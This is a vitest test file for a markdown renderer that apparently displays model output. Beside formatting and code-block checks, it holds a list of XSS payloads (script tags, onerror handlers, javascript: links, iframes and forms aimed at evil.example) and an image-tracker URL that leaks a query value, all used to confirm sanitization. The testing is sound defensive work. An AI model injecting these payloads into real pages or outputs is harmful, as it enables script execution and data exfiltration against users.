import { JSDOM } from 'jsdom';
import { describe, expect, it, vi } from 'vitest';

// happy-dom cannot run DOMPurify (its node removal is incomplete, so script and
// iframe survive). These tests need a real DOM, so the sanitizer runs on jsdom.
const jsdom = new JSDOM('');
vi.mock('dompurify', async () => {
  const { JSDOM: J } = await import('jsdom');
  const actual = await vi.importActual<typeof import('dompurify')>('dompurify');
  return { default: actual.default(new J('').window as unknown as Window & typeof globalThis) };
});

import { codeTextFor, renderMarkdown } from '../markdown';
import { highlightCode } from '../highlight';

function dom(html: string): HTMLElement {
  const el = jsdom.window.document.createElement('div');
  el.innerHTML = html;
  return el;
}

describe('GFM', () => {
  it('renders headings, emphasis, lists and inline code', () => {
    const el = dom(renderMarkdown('## Title\n\nSome **bold** and *it* and `code`.\n\n- a\n- b\n\n1. x\n2. y'));
    expect(el.querySelector('h2')?.textContent).toBe('Title');
    expect(el.querySelector('strong')?.textContent).toBe('bold');
    expect(el.querySelector('em')?.textContent).toBe('it');
    expect(el.querySelector('p code')?.textContent).toBe('code');
    expect(el.querySelectorAll('ul li')).toHaveLength(2);
    expect(el.querySelectorAll('ol li')).toHaveLength(2);
  });

  it('renders tables inside a scroll wrapper', () => {
    const el = dom(renderMarkdown('| a | b |\n|---|---|\n| 1 | 2 |'));
    expect(el.querySelector('.table-wrap > table')).not.toBeNull();
    expect(el.querySelectorAll('td')).toHaveLength(2);
  });

  it('renders strikethrough and disabled task-list checkboxes', () => {
    const el = dom(renderMarkdown('~~gone~~\n\n- [x] done\n- [ ] todo'));
    expect(el.querySelector('del')?.textContent).toBe('gone');
    const boxes = el.querySelectorAll('input[type=checkbox]');
    expect(boxes).toHaveLength(2);
    for (const b of boxes) expect(b.hasAttribute('disabled')).toBe(true);
  });

  it('autolinks bare URLs and opens links safely in a new tab', () => {
    const el = dom(renderMarkdown('see https://example.com/x and [docs](https://example.org "t")'));
    const links = [...el.querySelectorAll('a')];
    expect(links.map((a) => a.getAttribute('href'))).toEqual(['https://example.com/x', 'https://example.org']);
    for (const a of links) {
      expect(a.getAttribute('target')).toBe('_blank');
      expect(a.getAttribute('rel')).toBe('noopener noreferrer');
    }
  });

  it('turns an empty string into an empty result', () => {
    expect(renderMarkdown('')).toBe('');
  });
});

describe('code blocks', () => {
  const md = 'Run:\n\n```ts\nconst n: number = 1;\n```\n';

  it('highlights known languages and adds a header with a copy button', () => {
    const el = dom(renderMarkdown(md));
    const block = el.querySelector('.code-block');
    expect(block).not.toBeNull();
    expect(block?.querySelector('.code-lang')?.textContent).toBe('ts');
    const btn = block?.querySelector('button.code-copy');
    expect(btn?.getAttribute('type')).toBe('button');
    expect(btn?.hasAttribute('data-code-copy')).toBe(true);
    expect(btn?.getAttribute('aria-label')).toBe('Copy code');
    expect(block?.querySelector('pre code.hljs.language-ts')).not.toBeNull();
    expect(block?.querySelector('.hljs-keyword')?.textContent).toBe('const');
  });

  it('copies the raw source, not the markup', () => {
    const el = dom(renderMarkdown(md));
    expect(codeTextFor(el.querySelector('[data-code-copy]')!)).toBe('const n: number = 1;\n');
  });

  it('keeps unlabeled and unknown fences plain and escaped', () => {
    for (const fence of ['```\n<b>x</b>\n```', '```klingon\n<b>x</b>\n```']) {
      const el = dom(renderMarkdown(fence));
      expect(el.querySelector('pre code')?.textContent).toBe('<b>x</b>\n');
      expect(el.querySelector('pre code b')).toBeNull();
      expect(el.querySelector('.hljs-keyword')).toBeNull();
    }
  });

  it('handles the other registered languages and aliases', () => {
    for (const lang of ['python', 'py', 'bash', 'sh', 'json', 'yaml', 'yml', 'diff', 'css', 'html', 'go', 'rust', 'rs', 'sql', 'md', 'toml', 'dockerfile', 'js', 'shell']) {
      expect(highlightCode('x', lang).language, lang).not.toBeNull();
    }
    expect(highlightCode('x', 'cobol').language).toBeNull();
    expect(highlightCode('x', undefined).language).toBeNull();
  });

  it('never trusts the language label', () => {
    const el = dom(renderMarkdown('```"><img src=x onerror=alert(1)>\ncode\n```'));
    expect(el.querySelector('img')).toBeNull();
    expect(el.querySelector('.code-lang')?.textContent).toBe('');
  });

  it('is safe on a half-streamed message', () => {
    const el = dom(renderMarkdown('Here:\n\n```python\ndef f(x):\n    return x <'));
    expect(el.querySelector('.code-block pre code')?.textContent).toContain('return x <');
    expect(() => renderMarkdown('**bold and `code and [link](http://x')).not.toThrow();
    expect(() => renderMarkdown('<img src=x onerr')).not.toThrow();
    expect(() => renderMarkdown('| a | b\n|--')).not.toThrow();
  });
});

describe('XSS payloads', () => {
  const payloads: [string, string][] = [
    ['img onerror', '<img src=x onerror=alert(1)>'],
    ['script tag', '<script>alert(1)</script>'],
    ['javascript link', '[x](javascript:alert(1))'],
    ['javascript autolink', '<a href="javascript:alert(1)">x</a>'],
    ['data html link', '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
    ['svg onload', '<svg onload=alert(1)></svg>'],
    ['iframe', '<iframe src="https://evil.example"></iframe>'],
    ['inline style', '<p style="background:url(https://evil.example/x)">x</p>'],
    ['event handler on div', '<div onmouseover="alert(1)">x</div>'],
    ['form action', '<form action="https://evil.example"><input name=t></form>'],
    ['button formaction', '<button formaction="javascript:alert(1)">x</button>'],
    ['math', '<math><mi xlink:href="javascript:alert(1)">x</mi></math>'],
    ['style tag', '<style>body{display:none}</style>'],
    ['object', '<object data="javascript:alert(1)"></object>'],
    ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
    ['nested script', '<scr<script>ipt>alert(1)</scr</script>ipt>'],
  ];

  for (const [name, payload] of payloads) {
    it(`strips ${name}`, () => {
      const html = renderMarkdown(`before\n\n${payload}\n\nafter`);
      const el = dom(html);
      expect(el.querySelector('script, iframe, object, embed, style, form, meta, svg, math')).toBeNull();
      for (const node of el.querySelectorAll('*')) {
        for (const attr of node.getAttributeNames()) {
          expect(attr.startsWith('on'), `${attr} on <${node.tagName}>`).toBe(false);
          expect(attr).not.toBe('style');
        }
      }
      for (const a of el.querySelectorAll('a')) {
        expect(a.getAttribute('href') ?? '').not.toMatch(/^\s*(javascript|data|vbscript):/i);
      }
      expect(html).not.toMatch(/onerror|onload|onmouseover|javascript:/i);
      expect(el.textContent).toContain('before');
      expect(el.textContent).toContain('after');
    });
  }

  it('does not fetch remote images from model output', () => {
    const el = dom(renderMarkdown('![tracker](https://evil.example/p.png?q=secret)\n\n![local](data:image/png;base64,AAAA)'));
    expect(el.querySelector('img')).toBeNull();
    const a = el.querySelector('a');
    expect(a?.getAttribute('href')).toBe('https://evil.example/p.png?q=secret');
    expect(a?.textContent).toBe('tracker');
    expect(a?.getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('escapes html inside code', () => {
    const el = dom(renderMarkdown('```html\n<img src=x onerror=alert(1)>\n```\n\n`<script>x</script>`'));
    expect(el.querySelector('img, script')).toBeNull();
    expect(el.querySelector('pre code')?.textContent).toBe('<img src=x onerror=alert(1)>\n');
    expect(el.querySelector('p code')?.textContent).toBe('<script>x</script>');
  });

  it('cannot smuggle a copy button or a class into prose', () => {
    const el = dom(renderMarkdown('<button data-code-copy>x</button> <span class="code-copy">y</span>'));
    expect(el.querySelector('button')).toBeNull();
  });
});

describe('cache', () => {
  it('returns identical output for repeated input', () => {
    const a = renderMarkdown('# same');
    expect(renderMarkdown('# same')).toBe(a);
  });
});
